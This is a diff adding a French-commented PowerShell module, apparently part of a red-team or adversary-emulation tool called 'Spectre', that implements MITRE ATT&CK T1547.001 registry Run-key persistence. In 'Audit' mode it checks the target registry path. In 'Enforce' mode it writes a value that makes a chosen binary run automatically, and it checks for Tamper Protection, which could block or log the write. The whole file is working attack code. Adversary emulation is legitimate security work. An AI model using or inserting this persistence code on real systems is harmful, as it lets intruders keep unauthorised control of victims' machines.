@@ -1,0 +1,26 @@
+# --- DOCTRINE SPECTRE : T1547.001 (LOGIQUE TECHNIQUE) ---
+# Note : Les variables $RegPath, $ValueName et $TargetBinary sont injectees par la Forge.
+
+if ($Mode -eq "Audit") {
+    Out-Spectre "Verification de la cible : $RegPath" "DEBUG"
+    if (Test-Path $RegPath) {
+        $CurrentKeys = Get-ItemProperty -Path $RegPath -ErrorAction SilentlyContinue
+        Out-Spectre "Cible accessible. Valeurs actuelles detectees : $($CurrentKeys.PSObject.Properties.Name -join ', ')" "OK"
+    } else {
+        Out-Spectre "Erreur : Le chemin $RegPath est introuvable sur ce systeme." "ERR"
+    }
+}
+elseif ($Mode -eq "Enforce") {
+    Out-Spectre "Tentative d injection de persistance : $ValueName -> $TargetBinary" "WARN"
+    if ($TP) { 
+        Out-Spectre "Tamper Protection active. L ecriture dans $RegPath risque d etre bloquee ou loguee." "ERR"
+    }
+    
+    try {
+        New-ItemProperty -Path $RegPath -Name $ValueName -Value $TargetBinary -PropertyType String -Force -ErrorAction Stop | Out-Null
+        Out-Spectre "Persistance injectee avec succes dans le Registre." "OK"
+    }
+    catch {
+        Out-Spectre "ECHEC de l enforcement : $($_.Exception.Message)" "ERR"
+    }
+}
